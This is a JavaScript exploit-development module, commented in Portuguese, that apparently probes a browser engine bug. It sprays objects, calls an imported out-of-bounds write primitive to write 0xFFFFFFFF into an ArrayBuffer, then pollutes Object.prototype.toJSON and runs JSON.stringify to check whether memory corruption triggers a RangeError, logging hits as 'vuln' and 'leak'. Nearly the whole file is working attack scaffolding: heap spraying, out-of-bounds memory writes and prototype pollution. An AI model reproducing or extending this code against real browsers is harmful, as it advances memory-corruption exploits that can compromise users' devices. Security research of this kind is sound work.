// js/script3/testForInPropertyAccessRE.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// Usaremos a mesma classe MyComplexObjectForRangeError
class MyComplexObjectForRangeError {
    constructor(id) {
        this.id = `MyComplexObjRE-${id}`;
        this.marker = 0xFEFEFEFE;
        this.prop1 = "complex_prop1_re";
        this.prop2 = { nested: "complex_prop2_nested_re" };
        this.propA = "valA_re";
        this.propB = 2345689;
        this.propC = null;
        this.propD = { nested_prop_re: "valD_original_re" };
        this.propE = [101, 202, 303];
    }
}

// toJSON que tenta acessar this[prop] dentro do loop for...in
export function toJSON_ForInWithPropertyAccess() {
    const FNAME_toJSON = "toJSON_ForInWithPropertyAccess";
    let iteration_count = 0;
    const MAX_ITER_LOG = 20; // Logar as primeiras N iterações
    let props_payload = { variant: FNAME_toJSON, id_at_entry: "N/A", iterations_done: 0, props: {} };

    // Usar console.log para máxima chance de ver logs antes de um crash
    console.log(`[${FNAME_toJSON}] Entrando.`);
    try {
        props_payload.id_at_entry = String(this?.id).substring(0,20); // Tenta ler ID na entrada
        console.log(`[${FNAME_toJSON}] this.id na entrada: ${props_payload.id_at_entry}`);
    } catch(e_id_entry) {
        console.log(`[${FNAME_toJSON}] Erro ao ler this.id na entrada: ${e_id_entry.name}`);
        props_payload.id_at_entry_error = e_id_entry.name;
    }

    try {
        if (typeof this !== 'object' || this === null) {
            console.log(`[${FNAME_toJSON}] 'this' não é um objeto ou é nulo no início do loop.`);
            props_payload.error = "this is not object or null at loop start";
            return props_payload;
        }

        for (const prop in this) {
            iteration_count++;
            if (iteration_count <= MAX_ITER_LOG) {
                console.log(`[${FNAME_toJSON}] Iter: ${iteration_count}, Prop: '${prop}'`);
            }

            try {
                // TENTATIVA CRÍTICA DE ACESSAR A PROPRIEDADE
                const val = this[prop]; // <<<< Este acesso pode ser o gatilho do RangeError

                if (iteration_count <= MAX_ITER_LOG) {
                    let val_str = "N/A";
                    const val_type = typeof val;
                    if (val_type !== 'function' && val_type !== 'object') {
                        val_str = String(val).substring(0, 30);
                    } else if (Array.isArray(val)) {
                        val_str = `[Array(${val.length})]`;
                    } else if (val_type === 'object' && val !== null) {
                        val_str = `[object ${val.constructor?.name || ''}]`;
                    } else if (val_type === 'function') {
                        val_str = `[Function ${val.name || ''}]`;
                    }
                    console.log(`[${FNAME_toJSON}]   Prop '${prop}', Type: ${val_type}, Val_str: ${val_str}`);
                    props_payload.props[prop] = { type: val_type, value_str: val_str };
                }
            } catch (e_access) {
                console.error(`[${FNAME_toJSON}] ERRO ao acessar this['${prop}']: ${e_access.name} - ${e_access.message}`);
                logS3(`[${FNAME_toJSON}] ERRO ao acessar this['${prop}'] para id ${this.id}: ${e_access.name} - ${e_access.message}`, "error", FNAME_toJSON);
                props_payload.props[prop] = { error: `${e_access.name}: ${e_access.message}` };
                // Continuar o loop para ver se outras propriedades causam problema ou se o RangeError é global
            }

            if (iteration_count > 2000) { // Safety break
                console.log(`[${FNAME_toJSON}] Safety break: Excedeu 2000 iterações.`);
                logS3(`[${FNAME_toJSON}] Safety break: Excedeu 2000 iterações para this.id=${this.id}.`, "warn", FNAME_toJSON);
                props_payload.max_iter_reached = true;
                break;
            }
        }
        console.log(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações.`);
    } catch (e_loop) {
        console.error(`[${FNAME_toJSON}] EXCEPTION NO LOOP for...in (externo ao acesso da prop): ${e_loop.name} - ${e_loop.message}`);
        logS3(`[${FNAME_toJSON}] EXCEPTION NO LOOP for...in (externo ao acesso da prop) para this.id=${this.id}: ${e_loop.name} - ${e_loop.message}`, "error", FNAME_toJSON);
        props_payload.outer_loop_error = `${e_loop.name}: ${e_loop.message}`;
    }
    props_payload.iterations_done = iteration_count;
    return props_payload;
}


export async function executeForInPropertyAccessRETest() {
    const FNAME_TEST = "executeForInPropertyAccessRETest";
    logS3(`--- Iniciando Teste: Acesso a Propriedade em 'for...in' (RangeError Check) ---`, "test", FNAME_TEST);
    document.title = `ForIn PropAccess RE Check`;

    const spray_count = 5;
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObjectForRangeError...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRangeError(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando o primeiro MyComplexObjectForRangeError via JSON.stringify (com ${toJSON_ForInWithPropertyAccess.name})...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected = false;
    const obj_to_probe = sprayed_objects[0];

    if (!obj_to_probe) {
        logS3("Nenhum objeto para sondar.", "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ForInWithPropertyAccess,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`   Object.prototype.toJSON poluído com ${toJSON_ForInWithPropertyAccess.name}.`, "info", FNAME_TEST);

        logS3(`   Testando objeto 0 (ID: ${obj_to_probe.id})... ESPERANDO RangeError POTENCIAL.`, 'warn', FNAME_TEST);
        document.title = `Sondando MyComplexObj 0 (ForIn PropAccess RE)`;
        try {
            console.log(`--- [${FNAME_TEST}] ANTES de JSON.stringify(obj_to_probe) ---`);
            const stringifyResult = JSON.stringify(obj_to_probe);
            console.log(`--- [${FNAME_TEST}] APÓS JSON.stringify(obj_to_probe) ---`);
            logS3(`     JSON.stringify(obj[0]) completou. Resultado da toJSON:`, "info", FNAME_TEST);
            logS3(JSON.stringify(stringifyResult, null, 2), "leak", FNAME_TEST); // Log formatado

        } catch (e_str) {
            console.error(`--- [${FNAME_TEST}] ERRO NO CATCH de JSON.stringify: ${e_str.name} ---`, e_str);
            logS3(`     !!!! ERRO AO STRINGIFY obj[0] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) {
                logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }
            if (e_str.name === 'RangeError') {
                logS3(`       ---> RangeError: Maximum call stack size exceeded OCORREU! <---`, "vuln", FNAME_TEST);
                document.title = `RangeError REPRODUCED! (PropAccess)`;
            }
            problem_detected = true;
        }

    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        problem_detected = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!problem_detected) {
        logS3("RangeError NÃO ocorreu com a toJSON que acessa this[prop].", "good", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste Acesso a Propriedade em 'for...in' (RangeError Check) CONCLUÍDO ---`, "test", FNAME_TEST);
    if (document.title.includes("REPRODUCED")) {
        // Manter
    } else if (!problem_detected) {
        document.title = `ForIn PropAccess OK`;
    }
}
